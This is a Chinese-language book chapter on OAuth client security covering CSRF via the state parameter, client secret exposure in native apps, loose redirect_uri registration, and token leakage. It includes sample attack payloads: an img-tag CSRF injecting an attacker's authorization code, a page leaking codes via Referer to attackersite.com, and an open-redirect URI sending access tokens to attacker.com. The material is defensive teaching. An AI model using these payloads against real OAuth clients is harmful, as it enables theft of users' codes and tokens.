# 7.常见客户端漏洞

本章将介绍

- 避免在 OAuth 客户端中出现常见的实现漏洞
- 保护 OAuth 客户端免受已知攻击

正如我们在第 1 章中讨论过的，在 OAuth 生态里，客户端无论在类型多样性还是数量规模上，都远超其他组件。如果你要实现一个客户端，该怎么做？你当然可以下载
OAuth 核心规范[^1]，并尽可能严格地遵循它。此外，你还可以阅读 OAuth 社区里的一些实用教程，它们分散在各类邮件列表、博客等渠道中。如果你对安全性格外在意，甚至可以研读《OAuth
2.0 威胁模型与安全注意事项》规范[^2]，并参考类似的最佳实践指南。可即便如此，你的实现就一定坚不可破吗？在本章中，我们将聚焦几个针对客户端的常见攻击，并给出切实可行的防护方法。

[^1]: [RFC 6749](https://datatracker.ietf.org/doc/html/rfc6749)

[^2]: [RFC 6819](https://datatracker.ietf.org/doc/html/rfc6819)

## 客户端通用安全

OAuth 客户端需要保护几类关键信息。如果客户端持有 client secret，就必须确保它存放在外部人员不易获取的位置。客户端在获取并保存
access token 和 refresh token 时，同样需要保证这些令牌不会暴露给客户端软件本身之外的组件，以及它所交互的其他 OAuth
实体以外的任何一方。客户端还要格外注意，避免这些敏感信息被意外写入审计日志或其他记录介质，否则第三方日后可能会偷偷翻查并获取它们。这些基本属于常规的安全实践，具体如何落地会因客户端软件所处的平台不同而有所差异。

不过，除了从存储系统直接窃取信息这种简单情形外，OAuth 客户端仍然可能以多种方式受到攻击。最常见的错误之一，是把 OAuth
直接当作认证协议使用，却不采取任何额外的防护措施。这个问题范围非常广，因此我们在第 13
章用大量篇幅专门讨论。你会在那一章看到诸如“混淆代理问题”（confused deputy problem）以及其他与认证相关的安全隐患。对 OAuth
客户端而言，安全漏洞最糟糕的后果之一，是由于对 OAuth
协议的实现不严谨，导致资源所有者的授权码或访问令牌泄露。除了给资源所有者带来直接损害之外，这类事件还会让人对客户端应用的可靠性产生不确定性，并在产品使用层面引发严重连锁反应，给
OAuth 客户端背后的公司造成显著的声誉和/或经济损失。实现 OAuth 客户端时需要防范的安全威胁很多，接下来我们会在后续小节中逐一展开讨论。

## 针对客户端的 CSRF 攻击

如前几章所述，授权码模式和隐式授权模式都提到了建议使用的 state 参数。根据 OAuth 核心规范[^3]，该参数是：

[^3]: [RFC 6749](https://tools.ietf.org/html/rfc6749)

> 客户端用于在请求与回调之间维持状态的不透明值。授权服务器在将用户代理重定向回客户端时会携带该值。该参数应当用于防止跨站请求伪造（CSRF）。

那么，什么是跨站请求伪造（CSRF），我们为什么要重视它？先回答后半部分：CSRF 是互联网上最常见的攻击之一，也被列入 OWASP Top
Ten[^4]——该榜单汇总了当前最危险的 10 大 Web 应用安全漏洞及其有效的应对方法。它之所以如此“受欢迎”，一个重要原因在于大多数开发者对这种威胁并没有充分认识，从而让攻击者更容易得手。

[^4]: [https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_%28CSRF%29](https://owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_%28CSRF%29)

!!! note "什么是 OWASP？"

	开放式 Web 应用安全项目（OWASP）是一个非营利组织，致力于向开发者、设计师、架构师以及企业负责人普及最常见 Web 应用安全漏洞所带来的风险。其成员包括来自全球各地的多种安全专家，他们分享有关漏洞、威胁、攻击以及应对措施方面的知识。

当恶意应用诱使用户的浏览器向用户当前已通过身份验证的网站发起请求，并在此过程中执行用户并不想进行的操作时，就会发生
CSRF。这怎么可能？关键在于：浏览器会向任何来源发起请求（并携带
Cookie），从而在请求触发时执行特定操作。如果用户已登录某个网站，而该网站提供执行某类任务的能力；攻击者又设法让用户的浏览器对这些任务
URI 中的某一个发起请求，那么该任务就会以“已登录用户”的身份被执行。通常，攻击者会在邮件或网站中嵌入恶意 HTML 或 JavaScript
代码，在用户不知情的情况下请求一个特定的任务 URI 并触发执行（见图 7.1）。

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260104153415360.png){ loading=lazy }
  <figcaption>图 7.1  CSRF 攻击示例</figcaption>
</figure>

最常见也最有效的缓解措施，是在每个 HTTP 请求中加入一个不可预测的元素，这正是 OAuth 规范采用的对策。下面我们来看看，为什么强烈建议使用
state 参数来避免 CSRF，以及如何生成一个可安全使用的 state 参数。我们将通过一个攻击示例来说明这一点。[^5]
假设有一个支持授权码（authorization code）授权类型的 OAuth 客户端。当该 OAuth 客户端在其 OAuth 回调端点收到 code 参数后，会用收到的
code 去换取访问令牌（access token）。随后，当客户端代表资源所有者调用 API 时，会将访问令牌传给资源服务器。要发起攻击，攻击者只需启动一次
OAuth 流程，从目标授权服务器获取一个授权码，并在这里停止他的“OAuth 舞步”。接着，攻击者让受害者的客户端去“消费”攻击者的授权码。具体做法是在自己的网站上创建一个恶意页面，例如：

[^5]: [http://homakov.blogspot.ch/2012/07/saferweb-most-common-oauth2.html](homakov.blogspot.ch/2012/07/saferweb-most-common-oauth2.html)

``` html
<img src="https://ouauthclient.com/callback?code=ATTACKER_AUTHORIZATION_CODE">
```

并诱使受害者访问该页面（见图 7.2）。

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260104153613981.png){ loading=lazy }
  <figcaption>图 7.2：OAuth CSRF 攻击示例</figcaption>
</figure>

这会导致一个直接后果：资源所有者的客户端应用会被连接到攻击者的授权上下文中。当 OAuth 协议被用于认证时，这种情况会带来灾难性的后果，第
13 章将进一步讨论。

对 OAuth 客户端的缓解措施是：生成一个不可猜测的 state 参数，并在首次调用授权服务器时一并传递。规范要求授权服务器在重定向到
redirect URI 时，必须原样返回该值，作为重定向 URI 的参数之一。随后，当客户端收到对 redirect URI 的调用时，需要校验 state
参数的值：如果该参数缺失，或与最初传入的值不一致，客户端就应当以错误终止该流程。这样可以防止攻击者使用自己的授权码并将其注入到毫无防备的受害者客户端中。

一个很自然、也很容易出现的问题是：这个 state 参数应该是什么样的？规范并没有给出太多帮助，因为它的表述相当含糊：[^6]

[^6]: [https://tools.ietf.org/html/rfc6749#section-10.10](https://datatracker.ietf.org/doc/html/rfc6749#section-10.10)

> 攻击者猜中生成的令牌（以及其他不供终端用户处理的凭据）的概率必须小于或等于 2^-128，并且应当小于或等于 2^-160。

在第 3 章以及其他地方的客户端练习中，客户端代码会通过以下方式随机生成状态：

``` javascript
state = randomstring.generate();
```

在 Java 中，你也可以改用：

``` java
String state = new BigInteger(130, new SecureRandom()).toString(32);
```

生成的 state 值随后可以存到 Cookie 里，或者更恰当地存到 Session 中，并在后续按前面讲解的方式用于校验。虽然规范并未强制要求必须使用
state，但它被视为最佳实践，而且要抵御 CSRF 攻击也离不开它。

## 客户端凭据被盗

OAuth 核心规范定义了四种不同的授权模式（grant type）。每种模式在设计时都考虑了不同的安全与部署因素，应按其适用场景使用，如第
6 章所述。比如，隐式授权（implicit grant）适用于 OAuth 客户端代码运行在用户代理（user agent）环境中的场景。这类客户端通常是纯
JavaScript 应用，显然无法在浏览器端运行的客户端代码中有效隐藏 client_secret。相对地，传统的服务端应用可以使用授权码模式（authorization
code grant），并能将 client_secret 安全地存放在服务器端的某个位置。

那原生应用（native applications）呢？我们在第 6 章已经讨论过不同场景该选用哪种授权模式，这里再提醒一次：不建议原生应用使用隐式流程。需要重点理解的是：对原生应用来说，即便你设法把
client_secret “藏”在编译后的代码里，它也绝不能被当作真正的秘密。再晦涩的制品也可能被反编译，client_secret
也就不再是秘密了。同样的原则适用于移动端客户端和桌面原生应用。忘记这一简单原则，可能会酿成灾难。[^7] 第 12
章我们会详细讨论如何使用动态客户端注册（dynamic client registration）在运行时配置 client_secret。这里先不展开太多，在接下来的练习
ch-7-ex-1 中，我们会把动态注册接入第 6 章开发的原生应用。打开 ch-7-ex-1，并像之前一样在 native-client 目录下执行初始化命令：

[^7]: [http://stephensclafani.com/2014/07/29/hacking-facebooks-legacy-api-part-2-stealing-user-sessions/](http://stephensclafani.com/2014/07/29/hacking-facebooks-legacy-api-part-2-stealing-user-sessions/)

``` shell
> npm install -g cordova
> npm install ios-sim
> cordova platform add ios
> cordova plugin add cordova-plugin-inappbrowser
> cordova plugin add cordova-plugin-customurlscheme --variable URL_SCHEME=com.oauthinaction.mynativeapp
```

现在你已经准备好打开 www 文件夹并编辑 index.html 文件了。在本练习中我们不会修改其他文件，不过和往常一样，你仍然需要在练习期间运行授权服务器和受保护资源这两个项目。在该文件中，找到
client 变量，重点查看其中的客户端信息，注意其中的 client_id 和 client_secret 字段是空的。

``` javascript
var client = {
  'client_name': 'Native OAuth Client',
  'client_id': '',
  'client_secret': '',
  'redirect_uris': ['com.oauthinaction.mynativeapp:/'],
  'scope': 'foo bar'
};
```

这些信息会在动态注册阶段结束后于运行时可用。现在找到授权服务器信息，并添加 registrationEndpoint。

``` javascript
var authServer = {
  authorizationEndpoint: 'http://localhost:9001/authorize',
  tokenEndpoint: 'http://localhost:9001/token',
  registrationEndpoint: 'http://localhost:9001/register'
};
```

最后，我们需要在应用首次请求 OAuth Token 且尚未拥有 Client ID 时，接入动态注册请求。

``` javascript
var protectedResource = 'http://localhost:9002/resource';

window.onload = function() {
        if (!client.client_id) {
                $.ajax({
                        url: authServer.registrationEndpoint, 
                        type: 'POST',
                        data: client,
                        crossDomain: true,
                        dataType: ‘json'
                }).done(function(data) {
                        client.client_id = data.client_id;
                        client.client_secret = data.client_secret; 
                }).fail(function() {
                        $('.oauth-protected-resource').text('Error while fetching registration
                        endpoint'); 
                });
        }
}
```

我们现在已经准备好运行修改后的原生应用程序了

``` shell
> cordova run ios
```

这会在手机模拟器中启动应用。如果你走一遍常规的 OAuth 流程，现在可以看到 client_id 和 client_secret
都是刚生成的，而且每个原生应用实例都会不一样。这样就能避免把 client_secret 随原生应用制品一起打包分发的问题。

当然，线上环境的这类原生应用会把这些信息持久化下来，这样每次安装后的客户端只会在首次启动时注册一次，而不是用户每次打开都重新注册。不同客户端实例之间无法访问彼此的凭据，授权服务器也能区分不同的实例。

## 重定向 URI 的注册

在授权服务器上创建新的 OAuth 客户端时，选择要注册的 redirect_uri 时务必格外谨慎；尤其是 redirect_uri 必须尽可能具体。例如，如果你的
OAuth 客户端回调地址是

```shell
https://yourouauthclient.com/oauth/oauthprovider/callback
```

然后务必注册完整的 URL

```shell
https://yourouauthclient.com/oauth/oauthprovider/callback
```

而且不只是域名

```shell
https://yourouauthclient.com/
```

而且不是只包含路径的一部分

```shell
https://yourouauthclient.com/oauth
```

如果你在 redirect_uri
的注册要求上稍有疏忽，令牌劫持攻击就会比你想象的更容易得手。即便是经过专业安全审计的大厂，也曾在这方面踩过坑。[^8]

[^8]: [http://intothesymmetry.blogspot.it/2015/06/on-oauth-token-hijacks-for-fun-and.html](https://blog.intothesymmetry.com/2015/06/on-oauth-token-hijacks-for-fun-and.html)

造成这种情况的主要原因是，授权服务器有时会采用不同的 redirect_uri 校验策略。正如我们将在第 9
章看到的，授权服务器唯一真正可靠且安全的校验方式是进行精确匹配。其他所有可能的方案——比如基于正则表达式，或允许使用已注册
redirect_uri 的子目录——都不够理想，有时甚至存在风险。

表 7.1 允许子目录验证策略

| 注册的URL：http://example.com/path        | 是否匹配 |
|---------------------------------------|------|
| https://example.com/path              | 是    |
| https://example.com/path/subdir/other | 是    |
| https://example.com/bar               | 否    |
| https://example.com                   | 否    |
| https://example.com:8080/path         | 否    |
| https://other.example.com:8080/path   | 否    |
| https://example.org                   | 否    |

为了更好地理解在本例中“允许子目录”的校验策略意味着什么，请参见表 7.1。

如表 7.1 所示，当 OAuth 提供方采用“允许子目录”的方式来匹配 redirect_uri 时，redirect_uri 请求参数会具有一定的灵活性（更多示例可参见
GitHub API 安全文档[^9]）。

[^9]: [https://developer.github.com/v3/oauth/#redirect-urls](https://docs.github.com/zh/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps#redirect-urls) (June 2015)

现在，并不能简单地说：采用允许子目录校验策略的授权服务器本身就一定不好。但当它与某个 OAuth 客户端注册了“过于宽松”的
redirect_uri 结合在一起时，就确实是致命的。此外，OAuth 客户端在互联网上的暴露面越大，就越容易被人找到可利用的缺口，从而利用该漏洞。

### 通过 Referrer 窃取授权码

这里描述的第一种攻击针对授权码授权（authorization code grant），其核心是通过 HTTP Referrer
泄露信息。攻击结束时，攻击者成功劫持了资源所有者的授权码。要理解这种攻击，需要先了解什么是 Referrer，以及它在什么时候会被使用。HTTP
Referrer（规范里把它拼错成 “referer”）是一个 HTTP 头字段，浏览器（以及一般的 HTTP
客户端）在从一个页面跳转到另一个页面时会自动携带它。这样，新页面就能知道这次请求来自哪里，比如是否是从某个外部站点的链接跳转过来的。

假设你刚在某个 OAuth 提供商那里注册了一个 OAuth 客户端，而该提供商的授权服务器对 redirect_uri 采用的是允许子目录校验策略。

你的 OAuth 回调端点是

``` shell
https://yourouauthclient.com/oauth/oauthprovider/callback
```

但你注册时填写的是

``` shell
https://yourouauthclient.com/
```

你的 OAuth 客户端在进行 OAuth 集成时发起的请求片段可能如下所示：

``` shell
https://oauthprovider.com/authorize?response_type=code&client_id=CLIENT_ID&scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/oauth/oauthprovider/callback
```

该 OAuth 提供方采用的是对 redirect_uri 的“允许子目录”校验策略，因此只校验 URI 的起始部分；只要在已注册的 redirect_uri
后面继续拼接任意内容，就会被视为合法请求。也就是说，从功能角度看，这个已注册的 redirect_uri 完全有效，目前为止一切正常。

攻击者还需要能够在目标站点上、位于已注册重定向 URI 之下创建一个页面，例如：

``` shell
https://yourouauthclient.com/usergeneratedcontent/attackerpage.html
```

到这里，攻击者只需要构造一个如下形式的特殊 URI 即可：

```shell
https://oauthprovider.com/authorize?response_type=code&client_id=CLIENT_ID&scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/usergeneratedcontent/attackerpage.html
```

并通过各种各样的钓鱼手段诱导受害者点击该链接。

注意，这个精心构造的 URI 中包含一个 redirect_uri，指向攻击者的页面；该页面位于客户端已注册的合法重定向 URI
的某个子目录下。随后，攻击者就能将流程篡改为类似图 7.3 所示的形式。

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260105094559172.png){ loading=lazy }
  <figcaption>图 7.3 被盗的授权码</figcaption>
</figure>

由于你将 `https://yourouauthclient.com` 注册为 redirect_uri，而 OAuth 提供方又采用了“允许子目录”的校验策略，因此
`https://yourouauthclient.com/usergeneratedcontent/attackerpage.html` 对你的客户端来说同样是一个完全合法的 redirect_uri。

回顾一下我们已经了解的几点：

- 资源所有者通常只需要给某个 OAuth 客户端授权一次（首次发生时；参见第 1 章的 Trust On First
  Use（TOFU））。这意味着，只要服务器认为请求来自同一个客户端且访问权限相同，后续请求就会跳过手动同意页面。
- 人们往往更信任那些在安全方面有良好口碑的公司，因此这很可能不会触发用户的“反钓鱼警报”。

也就是说，现在这已经足以“说服”受害者点击精心构造的链接并进入授权端点，接下来受害者最终会看到类似这样的内容：

```shell
https://yourouauthclient.com/usergeneratedcontent/attackerpage.html?code=e8e0dc1c-2258-6cca-72f3-7dbe0ca97a0b
```

请注意，code 请求参数最终会被拼接到恶意 POST 请求的 URI 中。你可能会认为，攻击者必须能访问服务端处理逻辑，才能从这个 URI 里把 code 提取出来——而这类能力通常不会开放给用户生成内容页面。又或者，你会觉得攻击者需要往页面里注入任意 JavaScript，但在用户生成内容中，这往往会被过滤掉。不过，我们不妨更仔细地看看 attackerpage.html 的代码：

``` html
<html>
  <h1>Authorization in progress </h1>
  <img src="https://attackersite.com/">
</html>
```

这个简单的页面在资源所有者看来完全可能毫无异常。事实上，由于它甚至不包含任何 JavaScript 或其他功能性代码，还可以被嵌入到另一个页面中。但在后台，受害者的浏览器会加载指向攻击者服务器资源的嵌入式 img 标签。在这次请求中，HTTP Referer 头会泄露授权码（见图 7.4）。

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260105094756663.png){ loading=lazy }
  <figcaption>图 7.4：授权码劫持</figcaption>
</figure>

攻击者很容易从 Referer 中提取授权码，因为当受害者访问攻击者页面里嵌入的 img 标签时，浏览器发出的 HTTP 请求会把它一并带给攻击者。

!!! note "我的 Referrer 去哪儿了？  "

    攻击者帖子里的 URI 必须是 https URI。确实，根据 HTTP RFC [RFC 2616] 第 15.1.3 节（在 URI 中编码敏感信息）：

    - 如果引用页面是通过安全协议传输的，客户端在发起（非安全的）HTTP 请求时不应包含 Referer 头字段。  

    这一点在图 7.5 中进行了总结。

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260105094925474.png){ loading=lazy }
  <figcaption>图 7.5　引用来源策略</figcaption>
</figure>

### 通过开放重定向器窃取令牌  

还有一种攻击与上一节的思路类似，但它基于隐式授权（implicit grant）类型。这种攻击同样瞄准的是访问令牌（access token），而不是授权码（authorization code）。要理解这种攻击，你需要先弄清楚：在 HTTP 重定向响应（HTTP 301/302）中，浏览器会如何处理 URI 片段（# 之后的部分）。你可能知道，片段是文档 URI 可选的最后一部分，但它在重定向时会发生什么并不直观。举个具体例子：如果一个 HTTP 请求是 /bar#foo，服务器返回 302，并在 Location 中给出 /qux，那么 #foo 会不会被拼到新的 URI 上（也就是新请求变成 /qux#foo），还是不会（也就是新请求是 /qux）？

目前大多数浏览器在重定向时都会保留原始片段：也就是说，新请求会变成 /qux#foo。还要记住，片段永远不会发送到服务器，因为它本来就是给浏览器内部使用的。基于这一点，下面的攻击利用了另一类常见的 Web 漏洞——开放重定向（open redirect）。它也被 OWASP Top Ten[^10] 收录，并将其定义为：

[^10]: [https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards](https://owasp.org/www-project-top-ten/)

> 一个应用接收某个参数，并在不做任何校验的情况下将用户重定向到该参数指定的地址。该漏洞常被用于钓鱼攻击，让用户在毫无察觉的情况下跳转并访问恶意网站。

关于这类漏洞仍有一些争议[^11]，因为它们往往相对无害，但并非总是如此[^12]——正如我们在本章后文以及后续章节中将会看到的那样。

[^11]: [https://sites.google.com/site/bughunteruniversity/nonvuln/open-redirect](https://sites.google.com/site/bughunteruniversity/nonvuln/open-redirect)

[^12]: [http://andrisatteka.blogspot.ch/2015/04/google-microsoft-and-token-leaks.html](https://andrisatteka.blogspot.com/2015/04/google-microsoft-and-token-leaks.html)

这里的攻击与前一种类似，我们之前确立的所有前提同样适用：注册的 redirect_uri 过于宽松，以及授权服务器采用“允许子目录”的校验策略。由于这次泄露是通过开放重定向发生的，而不是借助 referrer，你还需要假设 OAuth 客户端域名本身也存在一个开放重定向点，例如：`https://yourouauthclient.com/redirector?goto=http://targetwebsite.com`。正如前面提到的，这类入口在网站上出现的概率并不低（即便是在 OAuth 场景中也是如此[^13]）。在第 9 章中，我们会在授权服务器的语境下对开放重定向器进行更深入的讨论。

[^13]: [https://hackerone.com/reports/26962](https://hackerone.com/reports/26962)

把我们目前讨论的内容串起来：

- 大多数浏览器在重定向时确实会保留原始 URI 的 fragment（片段）
- 开放重定向（Open Redirect）是一类被低估的漏洞
- 关于 redirect_uri 注册过于宽松（too loose）的讨论
  
攻击者可以构造如下这样的 URI：

```shell
https://oauthprovider.com/authorize?response_type=token&client_id=CLIENT_ID&scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/redirector?goto=https://attacker.com
```

如果资源所有者已通过 TOFU 授权过该应用，或者可以说服其再次为该应用授权，那么资源所有者的用户代理会被重定向到传入的 redirect_uri，并在 URI 片段（fragment）中追加 access_token：

```shell
https://yourouauthclient.com/redirector?goto=https://attacker.com#access_token=2YotnFZFEjr1zCsicMWpAA
```

此时，客户端应用中的开放重定向会将用户代理转发到攻击者的网站。由于在大多数浏览器中，URI 片段在重定向过程中仍会保留，最终落地页面将是：

```shell
https://attacker.com#access_token=2YotnFZFEjr1zCsicMWpAA
```

现在，攻击者要窃取访问令牌简直轻而易举。事实上，只要用 JavaScript 代码读取返回的 location.hash 就够了（见图 7.6）。

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260105100240972.png){ loading=lazy }
  <figcaption>图 7.6 通过片段劫持访问令牌</figcaption>
</figure>

上述两类攻击都可以通过同一个简单做法来缓解：尽可能注册最具体的 redirect_uri。以我们的示例来说，也就是注册 https://yourouauthclient.com/oauth/oauthprovider/callback 这种级别的地址。这样一来，客户端就能避免攻击者接管其 OAuth 域名的控制权。当然，你也需要在客户端应用的设计上确保攻击者无法在 https://yourouauthclient.com/oauth/oauthprovider/callback 之下创建页面；否则还是会回到原点。不过，注册得越具体、越直接，就越不容易存在一个恰好匹配且由恶意方控制的 URI。

## 授权码被窃取  

如果攻击者劫持了授权码，他们就能“偷走”什么东西吗，比如资源所有者的个人信息（邮箱、联系方式等）？还不行。要记住，授权码仍然只是 OAuth 客户端与访问令牌之间的中间环节，而访问令牌才是攻击者的最终目标。要用授权码换取访问令牌，需要 client_secret，而这必须被严格保护。但如果客户端是公共客户端（public client），它没有 client_secret，因此任何人都可以使用该授权码。对于机密客户端（confidential client），攻击者要么尝试恶意获取 client_secret（如 7.2 节所示），要么尝试诱骗 OAuth 客户端执行一种类似我们在 7.1 节见过的 CSRF。后一种情况我们会在第 9 章中介绍，并在那里分析其影响。

## 令牌被窃取  

对于把目标锁定在支持 OAuth 的系统上的攻击者来说，最终目的就是窃取访问令牌。访问令牌能让攻击者执行各种原本不该具备权限的操作。我们已经看到，OAuth 客户端会把访问令牌发送给资源服务器以调用 API。通常做法是把 bearer token 放在请求头里（Authorization: Bearer access_token_value）。RFC 6750 还定义了另外两种传递 bearer token 的方式。其中一种是 URI 查询参数[^14]：客户端可以通过 access_token 这个 query 参数把访问令牌放进 URI 里发送。虽然这种方式很简单，容易让人想用，但用它向受保护资源提交访问令牌存在很多缺点。

[^14]: [https://tools.ietf.org/html/rfc6750#section-2.3](https://datatracker.ietf.org/doc/html/rfc6750#section-2.3)

- 访问令牌最终会作为 `URI` 的一部分，被记录到 `access.log` 文件中。[^15]
- 人们在公共论坛上（例如 `Stack Overflow`）寻找答案时，往往会不加甄别地复制粘贴各种内容。这很可能导致访问令牌通过 `HTTP` 报文记录或访问 `URL` 被粘贴到这些论坛中，从而泄露。
- 此外，还存在一种与前一节类似的通过 `Referrer` 引发的访问令牌泄露风险，因为 `Referrer` 会包含完整的 `URL`。

[^15]: [http://thehackernews.com/2013/10/vulnerability-in-facebook-app-allows.html](https://thehackernews.com/2013/10/vulnerability-in-facebook-app-allows.html)

这种最后的方法可用于窃取访问令牌。[^16]

[^16]: [http://intothesymmetry.blogspot.it/2015/10/on-oauth-token-hijacks-for-fun-and.html](https://blog.intothesymmetry.com/2015/10/on-oauth-token-hijacks-for-fun-and.html)

让我们假设有一个 `OAuth` 客户端，会像下面这样把 `access token` 放在 `URI` 里发送给 `resource server`：

```shell
https://oauthapi.com/data/feed/api/user.html?access_token=2YotnFZFEjr1zCsicMWp
```

如果攻击者哪怕只是在某个页面上放置一个指向该目标页面（`data/feed/api/user.html`）的简单链接，那么 `Referer` 请求头就会泄露访问令牌（见图 `7.7`）。

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260105101422627.png){ loading=lazy }
  <figcaption>图 7.7：通过查询参数劫持 `access token`</figcaption>
</figure>

使用标准的 `Authorization` 请求头可以避免这类问题，因为访问令牌不会出现在 `URL` 中。尽管通过查询参数仍然是 `OAuth` 的一种有效方式，但客户端应当仅在万不得已时才采用，并且必须格外谨慎。

!!! note "Authorization Server Mix-Up"

    2016 年 1 月，`OAuth` 工作组邮件列表发布了一则安全公告，披露了由德国`特里尔大学`（`University of Trier`）和`鲁尔大学波鸿`（`Ruhr-University Bochum`）的研究人员分别独立发现的`Authorization Server Mix-Up`问题。该攻击可能影响那些同时拥有多个授权服务器签发的`client_id`的`OAuth`客户端：攻击者可借此诱骗客户端将来自某一服务器的机密信息（包括`client_secret`和`authorization code`）发送给另一个恶意服务器。关于该攻击的更多细节可在线查阅。[^17]

    截至本书写作时，`IETF OAuth`工作组正在推进一套标准化解决方案。作为临时缓解措施，客户端应当针对每个授权服务器分别注册不同的`redirect_uri`值，以便在不混淆回调的情况下区分不同的请求。

[^17]: [http://arxiv.org/abs/1601.01229andhttp://arxiv.org/pdf/1508.04324.pdf](https://arxiv.org/abs/1601.01229andhttp://arxiv.org/pdf/1508.04324.pdf)

## 原生应用最佳实践

在第 6 章中，我们讨论并构建了一个`原生应用`。我们已经看到，`原生应用`是直接运行在终端用户设备上的`OAuth`客户端，而如今这通常意味着移动平台。从历史上看，`OAuth`的一个薄弱环节是其在移动设备上的终端用户体验不佳。为了让用户体验更顺畅，`原生OAuth客户端`在将用户引导至`授权服务器`的`授权端点`（与`前端通道`交互）时，常常会借助一种称为`WebView`的组件。`WebView`是系统提供的组件，允许应用在自身的 UI 内展示网页内容。`WebView`充当的是一个嵌入式`用户代理`，与系统浏览器相互独立。

遗憾的是，`WebView`长期以来都伴随着安全漏洞与相关隐患。最突出的一点是，客户端应用可以检查`WebView`组件的内容，因此能够在终端用户向`授权服务器`进行身份验证时窃听其凭据。由于`OAuth`的核心目标之一就是让用户凭据完全不落入客户端应用之手，这种做法显然背道而驰。`WebView`的可用性也远不理想。因为它嵌入在应用内部，无法访问系统浏览器的`Cookie`、缓存或会话信息。因此，`WebView`也无法复用任何现有的认证会话，用户不得不反复登录多次。

`原生OAuth客户端`也可以完全通过外部`用户代理`（例如系统浏览器）来发起 HTTP 请求（就像我们在第 6 章构建的原生应用中所做的那样）。使用系统浏览器的一大优势在于，资源所有者能够看到 URI 地址栏，这对防钓鱼非常有效。它还能帮助培养用户习惯：只在可信网站上输入凭据，而不是在任何索要凭据的应用里输入。

在近年的移动操作系统中，又新增了第三种选择，融合了上述两种方式的优势。在这种模式下，系统向应用开发者提供了一种特殊的`WebView`风格组件。该组件可以像传统`WebView`一样嵌入应用内部，但它与系统浏览器采用相同的安全模型，从而实现`单点登录`式的用户体验。此外，宿主应用无法对其内容进行检查，因此在安全隔离上能够达到使用外部系统浏览器同等的水平。

为了总结这些以及其他原生应用特有的安全性与可用性问题，`OAuth工作组`正在制定一份名为`OAuth 2.0 for Native Apps`的新文档。[^18] 该文档中列出的其他建议还包括以下内容：

[^18]: [https://tools.ietf.org/html/draft-ietf-oauth-native-apps-01](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-native-apps-01)


- 对于自定义的重定向 `URI` scheme，应选择一个全局唯一、且你能够声明其所有权的 scheme。一种常见做法是使用反向 `DNS` 命名法，就像我们在示例应用中所做的那样：`com.oauthinaction.mynativeapp:/`。这种方式能有效避免与其他应用使用的 scheme 发生冲突，否则可能引发潜在的授权码拦截攻击。
- 为了降低与授权码拦截攻击相关的部分风险，建议使用 `Proof Key for Code Exchange (PKCE)`。我们会在第 `10` 章详细讨论 `PKCE`，并提供一个动手练习。

这些简单的注意事项，就能显著提升使用 `OAuth` 的原生应用的安全性与可用性。

## 7.8. 总结

`OAuth` 是一个设计良好的协议，但要避免安全隐患和常见错误，实现者必须理解其所有细节。本章我们看到，如果某个 `OAuth` 客户端在注册其 `redirect_uri` 时不够谨慎，攻击者就相对容易从中窃取授权码（`authorization code`）或访问令牌（`access token`）。在某些情况下，攻击者还可能恶意地将窃取到的授权码兑换为访问令牌，或利用授权码发起某种 `CSRF` 攻击。

- 按照规范建议使用 `state` 参数（即使它不是强制要求）。
- 理解并谨慎选择你的应用需要使用的正确授权方式（`grant` / `flow`）。
- 原生应用（`native applications`）不应使用隐式流程（`implicit flow`），因为它是为浏览器内客户端设计的。
- 原生客户端无法保护 `client_secret`，除非像动态注册（`dynamic registration`）那样在运行时进行配置。
- 已注册的 `redirect_uri` 必须尽可能具体、精确。
- 如果能避免，就不要把 `access_token` 作为 `URI` 参数传递。

现在我们已经把客户端加固好了，接下来看看有哪些方式可以保护我们的受保护资源（`protected resources`）。
